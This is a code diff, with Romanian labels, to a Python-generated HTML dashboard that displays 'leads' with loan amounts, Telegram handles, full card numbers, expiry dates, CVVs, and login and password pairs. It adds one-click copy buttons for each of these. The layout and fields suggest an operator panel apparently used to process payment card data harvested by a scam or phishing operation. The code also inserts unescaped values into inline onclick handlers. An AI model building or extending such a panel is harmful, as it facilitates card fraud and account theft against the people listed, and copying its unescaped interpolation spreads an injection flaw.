@@ -134,11 +134,42 @@ HTML_TEMPLATE = """
       color: #fff;
       font-weight: 600;
     }}
+    .account-details {{
+      background: rgba(56,255,179,0.07);
+      border-radius: 10px;
+      padding: 10px 12px;
+      margin-top: 10px;
+      color: #fff;
+      font-size: 1.01rem;
+      font-family: 'Inter', Arial, sans-serif;
+      word-break: break-all;
+      border: 1px solid #38ffb3;
+    }}
+    .account-details span {{
+      color: #38ffb3;
+      font-weight: 600;
+    }}
     .no-leads {{
       color:#fff;font-size:1.2rem;
       margin: 32px 0;
       text-align: center;
       width: 100%;
+    }}
+    .copy-btn {{
+      background: #222;
+      color: #38ffb3;
+      border: none;
+      border-radius: 6px;
+      padding: 2px 8px;
+      margin-left: 6px;
+      cursor: pointer;
+      font-size: 1em;
+      vertical-align: middle;
+      transition: background 0.15s;
+    }}
+    .copy-btn:hover {{
+      background: #38ffb3;
+      color: #0a1833;
     }}
     @media (max-width: 700px) {{
       .leads-grid {{
@@ -178,6 +209,28 @@ HTML_TEMPLATE = """
           (tab === 'nocard' && i===2)
         );
       }});
+    }}
+
+    function copyToClipboard(text, btn) {{
+      if (!navigator.clipboard) {{
+        // fallback pentru browsere vechi
+        var textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {{
+          document.execCommand('copy');
+        }} catch (err) {{}}
+        document.body.removeChild(textarea);
+      }} else {{
+        navigator.clipboard.writeText(text);
+      }}
+      // feedback vizual
+      if (btn) {{
+        var old = btn.innerHTML;
+        btn.innerHTML = '✔️';
+        setTimeout(function() {{ btn.innerHTML = old; }}, 900);
+      }}
     }}
   </script>
 </body>
@@ -225,25 +278,52 @@ def lead_to_card_html(lead, card=None):
         f"Suma solicitată: {c.get('requested_amount','')}"
     )
     telegram = c.get('telegram', '')
+    # Telegram link
+    telegram_link = ""
+    if telegram:
+        username = telegram.lstrip('@')
+        telegram_url = f"https://t.me/{username}"
+        telegram_link = (
+            f'<a href="{telegram_url}" target="_blank" style="color:#38ffb3;text-decoration:underline;">'
+            f"{telegram}</a> "
+            f'<button class="copy-btn" onclick="copyToClipboard(\'{telegram}\', this)" title="Copiază Telegram">@</button>'
+        )
     card_html = ""
     card_class = ""
     if card:
         card_html = (
             f'<div class="card-details">'
             f'<span>Card:</span><br>'
-            f'Număr: {card.get("number","")}<br>'
-            f'Expirare: {card.get("expiration","")}<br>'
-            f'CVV: {card.get("cvv","")}'
+            f'Număr: {card.get("number","")} '
+            f'<button class="copy-btn" onclick="copyToClipboard(\'{card.get("number","")}\', this)" title="Copiază numărul">📋</button><br>'
+            f'Expirare: {card.get("expiration","")} '
+            f'<button class="copy-btn" onclick="copyToClipboard(\'{card.get("expiration","")}\', this)" title="Copiază expirarea">📋</button><br>'
+            f'CVV: {card.get("cvv","")} '
+            f'<button class="copy-btn" onclick="copyToClipboard(\'{card.get("cvv","")}\', this)" title="Copiază CVV">📋</button>'
             f'</div>'
         )
         card_class = " has-card"
+    # Account Data section
+    account_data_html = (
+        f'<div class="account-details">'
+        f'<span>Date cont:</span><br>'
+        f'Login: {c.get("full_name","")} '
+        f'<button class="copy-btn" onclick="copyToClipboard(\'{c.get("full_name","")}\', this)" title="Copiază login">📋</button><br>'
+        f'Parolă: {lead["lead_id"]} '
+        f'<button class="copy-btn" onclick="copyToClipboard(\'{lead["lead_id"]}\', this)" title="Copiază parolă">📋</button>'
+        f'</div>'
+    )
     return f"""
     <div class="lead-card{card_class}">
-      <div class="lead-id">Lead ID: {lead['lead_id']}</div>
+      <div class="lead-id">
+        Lead ID: <span id="leadid-{lead['lead_id']}">{lead['lead_id']}</span>
+        <button class="copy-btn" onclick="copyToClipboard('{lead['lead_id']}', this)" title="Copiază Lead ID">📋</button>
+      </div>
       <div class="lead-date">Data: {lead['date']} &nbsp; Ora: {lead['time']}</div>
       <div class="lead-info">{info}</div>
-      <div class="lead-telegram">Telegram: {telegram}</div>
+      <div class="lead-telegram">Telegram: {telegram_link}</div>
       {card_html}
+      {account_data_html}
     </div>
     """
 
